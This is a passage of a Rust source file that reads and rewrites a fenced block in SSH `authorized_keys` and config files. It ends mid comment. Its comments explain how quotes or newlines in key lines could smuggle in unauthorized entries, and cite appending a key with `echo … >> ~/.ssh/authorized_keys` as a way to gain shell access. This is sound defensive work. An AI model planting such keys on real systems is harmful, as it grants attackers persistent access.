//! A fenced block in somebody else's dotfile, and every read and write of it.
//!
//! Two files use this and nothing else in the tree touches either: the daemon
//! writes `~/.ssh/authorized_keys`, and the client writes `~/.ssh/config` so Zed,
//! git and plain `ssh` can reach a runner. Both are files a person may already
//! depend on for their own reasons, and the failure mode is not a lost feature —
//! it is losing SSH access to your own runner, which `docs/farcooler-design.md`
//! calls out as release-blocking.
//!
//! So the rules here are narrow on purpose: only the lines between the two
//! markers are ours, a file whose fence cannot be understood is refused rather
//! than repaired, and a line inside the fence that we did not write is carried
//! through untouched rather than dropped.
//!
//! **This is a crate of its own so that both callers can have it.** It used to
//! live in `crates/daemon`, which made `crates/client` depend on the crate that
//! serves it — an edge pointing the wrong way, and one that had to be
//! target-gated so phones did not compile bundled SQLite and an HTTPS stack for a
//! call they cannot make. Everything here is the protocol's `Scope` and some
//! syscalls, so it builds for iOS and Android as readily as for a desktop and the
//! gate is gone rather than moved. Two implementations were never an option: a
//! second one would drift a missing `fsync` into a corrupted `~/.ssh/config`.

use std::io::{Read as _, Write as _};
use std::os::fd::OwnedFd;
use std::path::Path;

use farcooler_protocol::v1::Scope;
use rustix::fs::{AtFlags, FlockOperation, Mode, OFlags, RawMode};

/// The line that opens Far Cooler's block.
///
/// The em dash and the wording are load-bearing in one direction only: they
/// must never change once a runner has been enrolled, because an existing
/// file's marker is matched literally and a reworded constant would read as a
/// file with no fence and enroll a second block beneath the first.
pub const BEGIN: &str = "# BEGIN FAR COOLER — do not edit inside this block";

/// The line that closes it.
pub const END: &str = "# END FAR COOLER";

/// Which pair of markers a call means.
///
/// A parameter rather than a constant reached for directly, because the same
/// algorithm fences `~/.ssh/config` for the Mac app — through the FFI, not
/// through a second implementation in Swift. A routine whose failure mode is
/// losing SSH access should exist once.
#[derive(Debug, Clone, Copy)]
pub struct Markers<'a> {
    pub begin: &'a str,
    pub end: &'a str,
}

/// The markers `authorized_keys` uses.
pub const AUTHORIZED_KEYS: Markers<'static> = Markers { begin: BEGIN, end: END };

/// One line inside the fence.
///
/// Every line in the block becomes an `Entry`, including one we did not write:
/// dropping such a line would mean the next write deleted a key somebody added
/// by hand. `client_id.is_empty()` is what says a line is foreign.
#[derive(Debug, Clone)]
pub struct Entry {
    /// `SHA256:…`, as `ssh-keygen -lf` prints it, or empty when the key did not
    /// parse at all.
    pub fingerprint: String,
    /// The device this line enrolls, as the forced command names it — or, for a
    /// plain line of ours, as its comment does. Empty for a foreign line.
    pub client_id: String,
    /// What that device may do, as the forced command names it.
    ///
    /// `Unspecified` for a plain line of ours: it carries no scope, and the
    /// grant it confers is not one this daemon hands out. See `Grant::Shell`.
    pub scope: Scope,
    /// The key's comment, which for our own lines is the name `render` chose.
    pub label: String,
    /// The device's tailcat node public key, as the forced command names it.
    ///
    /// Empty for a foreign line, for a Key B of ours, and for every line
    /// written before the tunnel existed. Empty is not "unknown": it is a
    /// device the tunnel must never admit, which is exactly right for one
    /// enrolled by a build that had no tunnel to admit it to.
    pub node_key: String,
    /// Which local account's `authorized_keys` this line was read from.
    ///
    /// Not in the line — nothing in `authorized_keys` names the account it
    /// grants, the file's location is what does. `parse` leaves this `None` and
    /// the caller that opened the file fills it in, because the caller is the
    /// only one that knows.
    pub account: Option<String>,
    /// The line exactly as it was read, newline stripped, so a rewrite can put
    /// a foreign line back byte for byte.
    pub line: String,
    /// This is a plain line of ours — Key B, the one Zed, git and Terminal use.
    ///
    /// Separate from `scope` rather than a fourth scope word, because the two
    /// answer different questions: `scope` is what a Far Cooler session may ask
    /// this daemon for, and no session ever arrives on a plain line at all.
    /// `client.list` reports both so an app can show "Far Cooler access" and
    /// "shell access" as two rows for one Mac.
    pub shell_access: bool,
}

/// Why a fence could not be read or written.
#[derive(Debug)]
pub enum FenceError {
    /// The directory the file lives in does not exist, or the path names none.
    Missing,
    /// The file has a fence, but not one this can act on. The string says which
    /// way, for the daemon log — it is not for a screen and not for the wire.
    Damaged(String),
    Io(std::io::Error),
}

impl std::fmt::Display for FenceError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Missing => f.write_str("the directory that file lives in does not exist"),
            Self::Damaged(why) => write!(f, "the fence in that file is damaged: {why}"),
            Self::Io(e) => write!(f, "{e}"),
        }
    }
}

impl std::error::Error for FenceError {}

impl From<std::io::Error> for FenceError {
    fn from(e: std::io::Error) -> Self {
        Self::Io(e)
    }
}

/// A scope word, as `authorized_keys` and the session preamble spell it.
///
/// `None` is a word this daemon does not have, which refuses rather than
/// resolves. Absence of a scope is a decision — see `Session::granted` in the
/// binary — but a misspelling is a mistake, and rounding a mistake up to host
/// admin turns a typo on a line nobody re-reads into privilege escalation.
///
/// Here rather than in the binary because this module WRITES the word that the
/// binary later parses: one function for both directions means a line this
/// enrolls cannot spell a scope the daemon reading it does not have.
pub fn scope_from_word(word: &str) -> Option<Scope> {
    match word {
        "read" => Some(Scope::Read),
        "control" => Some(Scope::Control),
        "host_admin" => Some(Scope::HostAdmin),
        _ => None,
    }
}

/// The same word going out, for the forced command and the session preamble.
pub fn scope_word(scope: Scope) -> &'static str {
    match scope {
        Scope::Read => "read",
        Scope::Control => "control",
        // `Unspecified` cannot reach here from a parsed word, and an entry
        // rendered without a scope must not be rendered without a restriction:
        // host_admin is what a key with no scope at all already means.
        Scope::HostAdmin | Scope::Unspecified => "host_admin",
    }
}

/// Read the entries in `authorized_keys`' fence.
///
/// An absent fence is an empty list, not an error: a runner nobody has enrolled
/// a device on has no block, and that is the ordinary case.
pub fn parse(contents: &str) -> Result<Vec<Entry>, FenceError> {
    parse_within(contents, AUTHORIZED_KEYS)
}

/// The same, for a file fenced with other markers.
pub fn parse_within(contents: &str, markers: Markers<'_>) -> Result<Vec<Entry>, FenceError> {
    let lines: Vec<&str> = contents.lines().collect();
    let Some((begin, end)) = fence_span(&lines, markers)? else { return Ok(Vec::new()) };
    Ok(lines[begin + 1..end]
        .iter()
        .filter(|line| !line.trim().is_empty())
        .map(|line| entry_from_line(line))
        .collect())
}

/// Where the block starts and stops, or `None` when there is no block.
///
/// Everything that is not exactly one opening marker followed by exactly one
/// closing marker is damage, and damage refuses. The alternative is guessing
/// where the block ends, and a wrong guess rewrites lines Far Cooler did not
/// write — which is how somebody loses SSH access to their own runner.
fn fence_span(lines: &[&str], markers: Markers<'_>) -> Result<Option<(usize, usize)>, FenceError> {
    let find = |marker: &str| -> Vec<usize> {
        lines
            .iter()
            .enumerate()
            // `trim_end` so a file with CRLF line endings, or one an editor left
            // trailing spaces in, is still a file we recognize our own block in.
            .filter(|(_, line)| line.trim_end() == marker)
            .map(|(i, _)| i)
            .collect()
    };
    let begins = find(markers.begin);
    let ends = find(markers.end);
    match (begins.len(), ends.len()) {
        (0, 0) => Ok(None),
        (1, 1) if begins[0] < ends[0] => Ok(Some((begins[0], ends[0]))),
        (1, 1) => Err(FenceError::Damaged("the fence closes before it opens".into())),
        (0, n) => Err(FenceError::Damaged(format!("{n} closing markers and no opening one"))),
        (n, 0) => Err(FenceError::Damaged(format!("{n} fences that open and never close"))),
        (b, e) => Err(FenceError::Damaged(format!("{b} opening and {e} closing markers"))),
    }
}

/// Read one line of the block.
///
/// A line that is not ours in any respect — no forced command, a key that does
/// not parse, a hand-written comment — comes back foreign rather than dropped.
fn entry_from_line(line: &str) -> Entry {
    let raw = line.trim_end_matches(['\n', '\r']);
    let foreign = |key: Option<&ssh_key::PublicKey>| Entry {
        fingerprint: key
            .map(|k| k.fingerprint(ssh_key::HashAlg::Sha256).to_string())
            .unwrap_or_default(),
        client_id: String::new(),
        scope: Scope::Unspecified,
        label: key.map(|k| k.comment().to_string()).unwrap_or_default(),
        node_key: String::new(),
        account: None,
        line: raw.to_string(),
        shell_access: false,
    };

    // A bare key with no options field is either somebody else's or a Key B of
    // ours, and the comment is the only thing that can tell them apart — see
    // `shell_comment`. Parsing a foreign one anyway is worth doing, so the entry
    // can still be reported by fingerprint rather than as an opaque string.
    if let Ok(key) = ssh_key::PublicKey::from_openssh(raw) {
        let comment = key.comment().to_string();
        let Some(client_id) = shell_client_id(&comment) else { return foreign(Some(&key)) };
        return Entry {
            fingerprint: key.fingerprint(ssh_key::HashAlg::Sha256).to_string(),
            client_id: client_id.to_string(),
            // Not `HostAdmin`, though a shell is every power this account has:
            // the scope on an entry is what a session arriving on it may ask
            // this daemon for, and no session can arrive on a line with no
            // forced command. `shell_access` is what says what it does grant.
            scope: Scope::Unspecified,
            label: comment.clone(),
            node_key: String::new(),
            account: None,
            line: raw.to_string(),
            shell_access: true,
        };
    }
    let Some((options, rest)) = split_options(raw) else { return foreign(None) };
    let Ok(key) = ssh_key::PublicKey::from_openssh(rest) else { return foreign(None) };

    let client_id = forced_command(options)
        .and_then(|command| flag(command, "--client"))
        .filter(|id| !id.is_empty());
    let Some(client_id) = client_id else { return foreign(Some(&key)) };
    let scope = forced_command(options)
        .and_then(|command| flag(command, "--scope"))
        .and_then(scope_from_word)
        // A line of ours whose scope word this build does not have is still
        // ours, and reporting it as unspecified is honest: the daemon that
        // serves it will refuse the word too, so it grants nothing.
        .unwrap_or(Scope::Unspecified);
    // The filter is not decoration: a hand-edited line can hold anything, and
    // a node key read out of a file is admitted to a tunnel. Validate on the
    // way in as well as on the way out.
    let node_key = forced_command(options)
        .and_then(|command| flag(command, "--node-key"))
        .filter(|k| usable_node_key(k))
        .unwrap_or_default()
        .to_string();

    Entry {
        fingerprint: key.fingerprint(ssh_key::HashAlg::Sha256).to_string(),
        client_id: client_id.to_string(),
        scope,
        label: key.comment().to_string(),
        node_key,
        account: None,
        line: raw.to_string(),
        shell_access: false,
    }
}

/// The device a plain line of ours belongs to, out of its comment.
///
/// A plain line has no options field, so there is nowhere to put a forced
/// command and therefore nowhere to put `--client`. The comment is the only
/// field left, which is why `shell_comment` writes the id into it and why this
/// reads it back — without which `client.list` could not group a Mac's two keys
/// and `client.revoke` could not remove them together.
///
/// **The id here is never an identity claim.** A comment is not authenticated by
/// anything, and this one is not asked to be: it is read only to decide which
/// lines a revocation deletes and which rows a list groups. It cannot become a
/// session's client id, because sshd runs a shell on this line and no Far Cooler
/// session arrives on it at all.
///
/// The shape is checked, not merely the prefix. An id `render` would have
/// refused is an id `render` did not write, and adopting such a line would put
/// somebody's hand-added key inside the set `revoke` deletes.
fn shell_client_id(comment: &str) -> Option<&str> {
    // The first dot, because the readable half cannot contain one — a label is
    // filtered to alphanumerics, `_` and `-`, and a base64 fingerprint has no
    // dot either — while a client id may, and must come back whole.
    let (readable, client_id) = comment.split_once('.')?;
    if !readable.starts_with(SHELL_COMMENT) {
        return None;
    }
    usable_client_id(client_id).then_some(client_id)
}

/// Split a line's options field from the key it precedes.
///
/// sshd ends the options field at the first whitespace OUTSIDE a quoted string,
/// and that distinction is not academic here: our own forced command is
/// `restrict,command="~/.local/bin/farcoolerd --stdio --client c1 --scope read"`,
/// five spaces of which are inside the quotes. `ssh_key`'s own `authorized_keys`
/// parser splits at the first space instead, which cuts that command in half
/// and then reads `--stdio` as an algorithm name — which is why this does not
/// use it.
///
/// Backslash escaping inside the quotes is not modelled. Nothing this writes
/// contains a quote or a backslash, and being wrong about somebody else's line
/// costs only that the line is called foreign and left exactly as it was.
fn split_options(line: &str) -> Option<(&str, &str)> {
    let mut quoted = false;
    for (at, c) in line.char_indices() {
        match c {
            '"' => quoted = !quoted,
            c if c.is_whitespace() && !quoted => {
                return Some((&line[..at], line[at..].trim_start()));
            }
            _ => {}
        }
    }
    None
}

/// The forced command out of an options field, without its quotes.
///
/// Anchored to the start of an option — the field is comma-separated, and
/// `permitopen="…",command="…"` must find the second one rather than a suffix
/// of the first option's name.
fn forced_command(options: &str) -> Option<&str> {
    const NAME: &str = "command=\"";
    let (at, _) = options
        .match_indices(NAME)
        .find(|(at, _)| *at == 0 || options.as_bytes()[at - 1] == b',')?;
    options[at + NAME.len()..].split_once('"').map(|(command, _)| command)
}

/// The word after a flag in the forced command.
fn flag<'a>(command: &'a str, name: &str) -> Option<&'a str> {
    let mut words = command.split_whitespace();
    while let Some(word) = words.next() {
        if word == name {
            return words.next();
        }
    }
    None
}

/// Why a key was not enrolled.
///
/// Codes, with no payload. This crosses the protocol and the FFI to a screen,
/// and a parser message built from attacker-supplied bytes must not be the
/// sentence a person reads in Settings. The parser's own message goes to the
/// daemon log; the wire carries the code and the app owns the wording.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Rejected {
    /// The received key was more than one line.
    MultiLine,
    /// A key, but not one of an algorithm this enrolls.
    Algorithm,
    /// Not a public key at all.
    Unparseable,
    /// The client id would not survive being written into a forced command.
    ClientId,
    /// The caller did not say what the device may do.
    Unscoped,
    /// A plain line was asked for at a scope below `host_admin`.
    ShellScope,
    /// A node key that could not survive being written into a forced command,
    /// or one offered for a line that has no forced command to hold it.
    NodeKey,
}

impl std::fmt::Display for Rejected {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(match self {
            Self::MultiLine => "more than one line",
            Self::Algorithm => "not an ed25519 key",
            Self::Unparseable => "not a public key",
            Self::ClientId => "not a usable client id",
            Self::Unscoped => "no scope",
            Self::ShellScope => "a shell key below host_admin",
            Self::NodeKey => "not a usable node key",
        })
    }
}

/// What a line is FOR, which is what decides its shape.
///
/// **A Mac needs two keys, and this is the difference between them.** A forced
/// command is what makes a device's identity server-asserted — the id was
/// written here by whoever enrolled the key, and the connecting device never
/// sends it and cannot change it — but it also means sshd runs that program and
/// only that program, so `apps/macos/Sources/FarCooler/Editors.swift` opening a
/// worktree as `ssh://{host}{path}` gets the daemon where Zed wanted a shell.
/// Remove the forced command and there is nowhere left to put the client id.
/// Both keys, or neither works.
///
/// An earlier rule said "only a shell can grant a shell", enforced by having no
/// way to ask for a plain line at all. **That rule is relaxed here, and the
/// design document it came from already says why it can be:** a `control` device
/// drives a terminal and a terminal can run `echo … >> ~/.ssh/authorized_keys`,
/// so refusing plain lines never stopped an attacker — it stopped an accident.
/// See "What `control` really means" in
/// `docs/superpowers/specs/2026-08-16-device-onboarding-design.md`.
///
/// What is kept is everything the guard rail was actually worth: `host_admin`
/// and nothing less, one closed choice of two shapes rather than a field that
/// carries bytes, the same parse-and-re-serialize path for both, and — the point
/// of doing it here at all — the plain line lands INSIDE the fence, so
/// `client.list` reports it and `client.revoke` removes it. A shell key smuggled
/// in through a terminal is managed by nobody.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Grant {
    /// Key A: `restrict`, a forced command, and a scope. What the app and the
    /// CLI use, and the only kind a phone ever gets.
    FarCooler,
    /// Key B: a plain, unrestricted line. What Zed, git and Terminal use.
    ///
    /// It is a shell on this account, which is every power the account has, so
    /// it is written only at `host_admin` — see `render`.
    Shell,
}

/// The program a Key A line makes sshd run, and how it is spelled.
///
/// `~/.local/bin/<channel daemon>`, not a bare `farcoolerd`, and both halves of
/// that matter.
///
/// **The path, because a forced command has no useful PATH.** sshd runs it
/// through the account's login shell, so what resolves a bare name is whatever
/// that user's shell startup files happen to leave behind — and
/// `runner install` puts the daemon in `~/.local/bin`, which plenty of shell
/// configs never add. A bare name therefore produces the worst failure this
/// feature has: the device enrolls, sshd accepts its key, the forced command
/// fails to resolve, and the client sees only a handshake that never arrives.
/// Nothing in the fence, in `client.list`, or in any log says why. The tilde is
/// expanded by that same login shell, which is why this needs no absolute path
/// baked into a file that outlives the process writing it.
///
/// **The channel, because `~/.local/bin` is shared.** A Mac with stable and
/// canary installed has both daemons in there under different names — that is
/// exactly what `Channel::daemon_binary_name` exists for. A canary daemon that
/// enrolled a device against a bare `farcoolerd` would point it at the STABLE
/// install's database, tmux server and runtime directory, with neither side able
/// to notice.
///
/// This is the same rule, and the same spelling, as `remote::daemon_command` in
/// `crates/cli` and the `~/.local/bin` symlinks the Mac app writes in
/// `CommandLineTools.swift`. It has been got wrong before: see the comment on
/// `runner_install::daemon_name`, which records that it was two spellings once
/// and the second one was `farcoolerd` on every channel. A third copy of the
/// rule is a third chance to drift, so all three read the channel.
fn forced_program() -> String {
    format!("~/.local/bin/{} --stdio", farcooler_protocol::CHANNEL.daemon_binary_name())
}

/// Turn a received public key into the one line this runner will enroll.
///
/// Never write bytes that came off the wire. `authorized_keys` is line-oriented
/// and every line may carry options BEFORE the key, so appending a received
/// string can append a second entry granting a stranger a key that runs a
/// command on every connection — and nothing about that write is malformed, so
/// it succeeds. Everything below rebuilds the line from decoded key material
/// and strings this runner chose; the only thing that survives from `received`
/// is 32 bytes of ed25519 point, re-encoded.
///
/// Two things about `ssh_key` that the design's first draft had backwards, and
/// that are easy to get wrong again: `to_openssh()` ALREADY returns
/// `algorithm base64 comment`, so prefixing the algorithm emits
/// `ssh-ed25519 ssh-ed25519 AAAA…` and enrolls nothing. And `from_openssh`
/// KEEPS the comment it parsed, so "trailing garbage fails to parse" is false —
/// trailing text is a valid comment. Rebuilding from `key_data()` is the only
/// thing that actually regenerates it.
///
/// A plain line of ours is `Grant::Shell`, and `scope` must be `HostAdmin` for
/// one: an unrestricted line on this account is a shell, and a shell is every
/// power the account has, so a request that asks for one while saying `read` or
/// `control` does not agree with itself. The caller's OWN scope is checked in
/// `rpc` — `client.enroll` has always required `host_admin` — and this is the
/// second half of that: the field a UI fills in for Key A cannot be passed
/// through unchanged and quietly produce Key B.
pub fn render(
    received: &str,
    label: &str,
    client_id: &str,
    scope: Scope,
    grant: Grant,
    node_key: Option<&str>,
) -> Result<String, Rejected> {
    if received.contains(['\r', '\n']) {
        return Err(Rejected::MultiLine);
    }
    if let Some(node_key) = node_key {
        // A plain line has no forced command, so there is nowhere to put this.
        // Refusing beats writing a line that silently admits nothing.
        if grant == Grant::Shell || !usable_node_key(node_key) {
            return Err(Rejected::NodeKey);
        }
    }
    // The client id is interpolated into the forced command, inside quotes, so
    // it is a second way to smuggle a line in: an id containing `"` closes the
    // command and turns the rest of the line into a key of the attacker's
    // choosing, and one containing a space breaks the flag the daemon reads
    // back. On a plain line it lands in the comment instead, which runs to the
    // end of the line — a different field, the same two ways to end it early.
    // One charset for both, so neither drifts. This is not a name a person
    // types — it identifies a device — so refusing an unusable one costs
    // nothing.
    if !usable_client_id(client_id) {
        return Err(Rejected::ClientId);
    }
    match grant {
        // A scope of `Unspecified` is what a caller that set no scope field
        // sends, and it ranks BELOW read everywhere else in this daemon —
        // `rpc::satisfies` grants it nothing. Writing it as host_admin, which is
        // what an unscoped line already means to sshd, would turn a forgotten
        // field into the whole runner. Refusing is the only reading that cannot
        // escalate.
        Grant::FarCooler if matches!(scope, Scope::Unspecified) => {
            return Err(Rejected::Unscoped);
        }
        Grant::Shell if !matches!(scope, Scope::HostAdmin) => return Err(Rejected::ShellScope),
        _ => {}
    }

    let parsed = ssh_key::PublicKey::from_openssh(received).map_err(|e| {
        // The message, which is built from bytes off the wire, stops here.
        tracing::debug!(error = %e, "a received key did not parse");
        Rejected::Unparseable
    })?;
    if !matches!(parsed.algorithm(), ssh_key::Algorithm::Ed25519) {
        return Err(Rejected::Algorithm);
    }

    let fingerprint = parsed.fingerprint(ssh_key::HashAlg::Sha256).to_string();
    let comment = match grant {
        Grant::FarCooler => comment_for(label, &fingerprint),
        Grant::Shell => shell_comment(label, &fingerprint, client_id),
    };
    let key = ssh_key::PublicKey::new(parsed.key_data().clone(), comment);
    let body = key.to_openssh().map_err(|e| {
        tracing::debug!(error = %e, "a parsed key could not be re-encoded");
        Rejected::Unparseable
    })?;
    let line = match grant {
        Grant::FarCooler => key_a_line(&body, client_id, scope, node_key),
        // No options field at all, which is the entire difference: sshd gives
        // this key a shell, so Zed, git and Terminal work. The key material and
        // the comment are still rebuilt above, so a plain line is not a way to
        // write bytes a restricted line would have refused.
        Grant::Shell => body,
    };
    // Not an assertion about the input — every part of this line is now
    // something this function built — but about the rules above still holding
    // together if one of them is ever edited.
    debug_assert!(!line.contains(['\r', '\n']));
    Ok(line)
}

/// The exact spelling of a Key A line, in the one place it is spelled.
///
/// `render` writes one for a device being enrolled and `with_node_key` writes
/// one for a device that is already enrolled. Two `format!`s would be two
/// spellings of the options field, and the day they drift is the day a
/// re-rendered line stops being the line the parser reads back — which for this
/// file means a device that Settings says is enrolled and that cannot log in.
///
/// Every argument is something this crate chose or has already filtered:
/// `body` is re-encoded key material, `client_id` passed `usable_client_id`,
/// `scope` is one of three words `scope_word` owns, and `node_key` passed
/// `usable_node_key`. Nothing off the wire reaches here unchecked.
fn key_a_line(body: &str, client_id: &str, scope: Scope, node_key: Option<&str>) -> String {
    let node = node_key.map(|k| format!(" --node-key {k}")).unwrap_or_default();
    format!(
        "restrict,command=\"{} --client {client_id} --scope {}{node}\" {body}",
        forced_program(),
        scope_word(scope),
    )
}

/// One of our own Key A lines, rewritten to admit a node key to the tunnel.
///
/// **The migration path, and the reason it needs no ceremony.** A fleet
/// enrolled before the tunnel existed carries lines with no node key, which
/// `allowlist::from_entries` reads as a runner that admits nobody. This is how
/// such a device registers one: over the SSH access it already holds, onto the
/// line it already has. It grants nothing — the line's forced command, its
/// client id and its scope all come back byte-identical, and the only thing
/// that changes is a route to access the caller is using to ask.
///
/// **Rebuilt, never spliced.** The line is composed from the entry's DECODED
/// key material and the fields the parser read back out of it, through the same
/// `key_a_line` that wrote it in the first place. Appending ` --node-key …`
/// into the string that was read would be the exact mistake `render`'s doc
/// comment exists to forbid: `authorized_keys` is line-oriented, options come
/// before the key, and a line edited in place is a line whose options field
/// something else can end early.
///
/// Refuses a plain line: Key B has no forced command, so there is nowhere to
/// put the flag — the same refusal `render` makes for `Grant::Shell`.
pub fn with_node_key(entry: &Entry, node_key: &str) -> Result<String, Rejected> {
    // A plain line of ours, or a foreign one. Neither has a forced command to
    // hold this, and a foreign line is somebody's hand-added key that this
    // crate must never rewrite at all.
    if entry.shell_access || !usable_client_id(&entry.client_id) {
        return Err(Rejected::NodeKey);
    }
    if !usable_node_key(node_key) {
        return Err(Rejected::NodeKey);
    }
    // A line whose scope word this build does not have parses as `Unspecified`,
    // and `scope_word` renders `Unspecified` as `host_admin` — so re-rendering
    // one would silently promote a word this daemon cannot read into the whole
    // runner. Refusing leaves the line exactly as it was, which is what a
    // daemon that cannot read the line should do to it.
    if matches!(entry.scope, Scope::Unspecified) {
        return Err(Rejected::Unscoped);
    }
    // The key half of the line, as the parser found it. `split_options` and not
    // a split on the first space: our own forced command contains five of them
    // inside its quotes.
    let (_, rest) = split_options(&entry.line).ok_or(Rejected::Unparseable)?;
    let parsed = ssh_key::PublicKey::from_openssh(rest).map_err(|e| {
        tracing::debug!(error = %e, "a line in the fence did not parse back as a key");
        Rejected::Unparseable
    })?;
    if !matches!(parsed.algorithm(), ssh_key::Algorithm::Ed25519) {
        return Err(Rejected::Algorithm);
    }
    // The comment is carried through rather than rebuilt from a label: it is
    // the name `render` already chose for this device, and re-deriving it would
    // wrap `farcooler-…` around itself and rename the device in Settings on
    // every migration.
    let key = ssh_key::PublicKey::new(parsed.key_data().clone(), parsed.comment().to_string());
    let body = key.to_openssh().map_err(|e| {
        tracing::debug!(error = %e, "a parsed key could not be re-encoded");
        Rejected::Unparseable
    })?;
    let line = key_a_line(&body, &entry.client_id, entry.scope, Some(node_key));
    // Same assertion `render` makes, for the same reason: not about the input,
    // which is all filtered above, but about the rules still holding together
    // if one of them is ever edited.
    debug_assert!(!line.contains(['\r', '\n']));
    Ok(line)
}

/// A client id that survives being written into a line and read back out of it.
///
/// One predicate for both directions and both shapes: `render` refuses what it
/// cannot write, and `shell_client_id` refuses to adopt a plain line carrying an
/// id `render` would not have written.
fn usable_client_id(client_id: &str) -> bool {
    !client_id.is_empty()
        && client_id.len() <= 64
        && client_id.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
}

/// 43 characters of unpadded base64, and nothing else.
///
/// Deliberately not a base64 decode: what matters here is that the string
/// cannot end the quoted command it is interpolated into, and a decoder that
/// accepts whitespace or padding would let it. An X25519 public key is 32
/// bytes, so the length is a constant rather than a range.
fn usable_node_key(node_key: &str) -> bool {
    node_key.len() == 43
        && node_key.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
}

/// The key is the identity; the comment is a label for humans.
///
/// A filtered name is not an identity — two devices filter to the same string,
/// and renaming a phone must not collide with another. The fingerprint suffix
/// is what makes the comment unique; the name is what makes it readable.
fn comment_for(label: &str, fingerprint: &str) -> String {
    format!("farcooler-{}", readable(label, fingerprint))
}

/// What says a plain line is one of ours, and whose it is.
///
/// A plain line has no options field, so this comment is the only field it has:
/// it carries the marker that makes the line MANAGED — without it a Key B would
/// be indistinguishable from a key somebody added by hand, and `client.revoke`
/// must never delete one of those — and the device id, so that revoking a Mac
/// removes both of its keys in one write rather than in two calls that can half
/// fail.
///
/// The dot is the delimiter because the readable half cannot contain one: a
/// label is filtered to alphanumerics, `_` and `-`, and a base64 fingerprint has
/// no dot either. A client id may contain dots, and splitting at the FIRST one
/// hands the whole id back whatever it contains.
fn shell_comment(label: &str, fingerprint: &str, client_id: &str) -> String {
    format!("{SHELL_COMMENT}{}.{client_id}", readable(label, fingerprint))
}

/// The prefix every plain line of ours carries, and the only thing a person
/// reading `authorized_keys` needs to see to know which key is which.
const SHELL_COMMENT: &str = "farcooler-shell-";

/// A filtered name and a short fingerprint: the half of a comment a human reads.
fn readable(label: &str, fingerprint: &str) -> String {
    let keep = |c: char| if c.is_ascii_alphanumeric() || c == '_' { c } else { '-' };
    let safe: String = label.chars().map(keep).collect();
    let safe = safe.trim_matches('-');
    let safe = if safe.is_empty() { "device" } else { safe };
    let short: String = fingerprint.trim_start_matches("SHA256:").chars().take(8).collect();
    format!("{safe}-{short}")
}

/// The entries in a file's fence, read the same way a write reads it.
///
/// Here rather than a `read_to_string` at the call site, because this module's
/// first claim is that nothing else in the tree touches that file — and the
/// claim is only worth making if reading goes through the same
/// descriptor-anchored open, the same ownership and mode checks, and the same
/// refusal on a FIFO or a non-UTF-8 file. A read cannot be redirected by a
/// symlink race the way a rename can, but a read that reported a stranger's
/// keys as this runner's would still be a lie told to a settings screen.
///
/// A file that is not there yet is an empty list, not an error: a runner nobody
/// has enrolled a device on has no `authorized_keys`, and that is ordinary.
///
/// Creates `.ssh` at 0700 if it does not exist, as a side effect of anchoring
/// the open. Harmless and the mode sshd's `StrictModes` wants anyway, and the
/// alternative is a second directory-opening path that gets to be wrong on its
/// own.
pub fn read(path: &Path, markers: Markers<'_>) -> Result<Vec<Entry>, FenceError> {
    let name = path.file_name().ok_or(FenceError::Missing)?;
    let directory = open_fence_dir(path.parent().ok_or(FenceError::Missing)?)?;
    match read_at(&directory, name)? {
        Some((text, _)) => parse_within(&text, markers),
        None => Ok(Vec::new()),
    }
}

/// Replace the fence's contents, leaving every byte outside it identical.
///
/// `entries` are the lines this program means to have in the block and
/// `foreign` are the ones it found there and did not write — carried through
/// rather than dropped, because dropping one would delete a key somebody added
/// by hand. Both empty removes the block entirely: a file with nothing enrolled
/// in it should not carry two marker lines forever.
///
/// The whole file is rewritten, never appended to. Appending is how a file
/// whose last line has no newline turns two keys into one very long comment,
/// and it is the classic way to lose access to a machine.
///
/// Refuses, rather than repairing, on a fence it cannot read: see `fence_span`.
///
/// The lock is advisory and only against another Far Cooler writer. A person
/// editing this file in an editor at the same moment is not something any of
/// this can prevent, which is part of why the backup exists.
///
/// **The lock is taken in here, which is why a caller that needs to READ the
/// block before deciding what to write must use `update` instead.** Calling
/// `read` and then this leaves the read outside the lock, and two such callers
/// landing together each rebuild the block from a snapshot taken before the
/// other's write — a lost update, which for this file is a device that cannot
/// log in. This entry point is for callers that compose the whole block from
/// scratch and have nothing to read first.
pub fn write(
    path: &Path,
    markers: Markers<'_>,
    entries: &[String],
    foreign: &[String],
    placement: Placement,
) -> Result<(), FenceError> {
    let name = path.file_name().ok_or(FenceError::Missing)?;
    let directory = open_fence_dir(path.parent().ok_or(FenceError::Missing)?)?;
    let _lock = hold_lock(&directory, name)?;

    let current = read_at(&directory, name)?;
    write_locked(&directory, name, current.as_ref(), markers, entries, foreign, placement)
}

/// What a caller wants done with the block `update` just handed it.
///
/// A closed choice of two rather than "an empty set means leave it alone",
/// because for this file those are different things: an empty set is a file with
/// nothing enrolled in it, which `write` renders as no block at all, and that is
/// a real request `revoke` makes when it removes the last device. `Leave` is
/// "nothing to do", which must not rewrite the file at all — see
/// `Change::Leave`.
#[derive(Debug)]
pub enum Change {
    /// Replace the block with these lines: ours first, then the ones we did not
    /// write. Both empty removes the block, exactly as in `write`.
    Write { entries: Vec<String>, foreign: Vec<String> },
    /// Leave every byte of the file as it is.
    ///
    /// Not a rewrite of what was read, which would look the same and is not: it
    /// would take a fresh backup, overwriting the one copy of the file from
    /// before the last real change, and it would spend an fsync on a file that
    /// did not need one. `client.enroll` on a device that is already enrolled
    /// answers without writing, and this is how it says so from inside the lock.
    Leave,
}

/// Read the block, decide what it should be, and write it — under one lock.
///
/// **This exists because `write` alone could not close a lost update, and the
/// hole was real rather than theoretical.** `write` takes the advisory lock
/// internally, so a caller doing read-modify-write through `read` and then
/// `write` did its reading OUTSIDE the lock: two enrollments landing in the same
/// instant each rebuilt the block from a snapshot taken before the other's write
/// landed, and the loser's key was silently gone. Neither write was malformed
/// and neither failed — the file was simply short one line, which for this file
/// is a device that Settings says is enrolled and that cannot connect. Onboarding
/// a Mac is two enrollments of one client id, which made it the easiest way in
/// the product to hit. `enrollment.rs` carried the hazard as a doc comment and
/// `apps/macos/Sources/FarCooler/Ceremony/Enrollment.swift` carried it as a rule
/// about call order — and a rule enforced by a comment is not enforced, which is
/// why the fix is here and not there. That Swift comment is stale now: those two
/// calls may overlap.
///
/// The closure is called exactly once, with the block as the file reads it right
